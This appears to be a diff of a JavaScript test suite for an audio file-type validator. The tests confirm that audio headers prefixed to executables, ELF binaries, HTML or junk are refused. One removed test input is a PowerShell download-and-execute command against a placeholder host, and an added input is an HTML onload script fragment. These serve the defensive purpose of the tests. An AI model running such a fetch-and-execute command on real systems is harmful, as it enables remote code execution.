@@ -573,11 +573,15 @@ test("real sounds of each kind pass the whole-file check", () => {
 });
 
 test("a sound's header in front of something else is refused", () => {
-  const exe = cat(enc("MZ"), new Uint8Array(100), enc("This program cannot be run in DOS mode."), new Uint8Array(4000));
+  // a program: an "MZ" header whose 0x3c field points at a "PE" one
+  const exe = new Uint8Array(4096);
+  exe.set(enc("MZ")); exe[0x3c] = 0x80; exe.set(enc("PE"), 0x80);
+  const elf = cat(new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]), new Uint8Array(4000));
   const id3 = new Uint8Array([0x49, 0x44, 0x33, 3, 0, 0, 0, 0, 0, 0]);
   // only a header, then a program, a script, junk
   assert.equal(audioType(cat(id3, exe)), "");
-  assert.equal(audioType(cat(id3, enc("powershell -c iwr http://x | iex"), new Uint8Array(500))), "");
+  assert.equal(audioType(cat(id3, enc("<html><body onload=x()>"), new Uint8Array(500))), "");
+  assert.equal(audioType(cat(mp3bytes(), elf)), "");
   assert.equal(audioType(cat(id3, new Uint8Array(4000).fill(0x41))), "");
   assert.equal(audioType(cat(enc("RIFF\0\0\0\0WAVE"), exe)), "");
   assert.equal(audioType(cat(enc("OggS"), exe)), "");
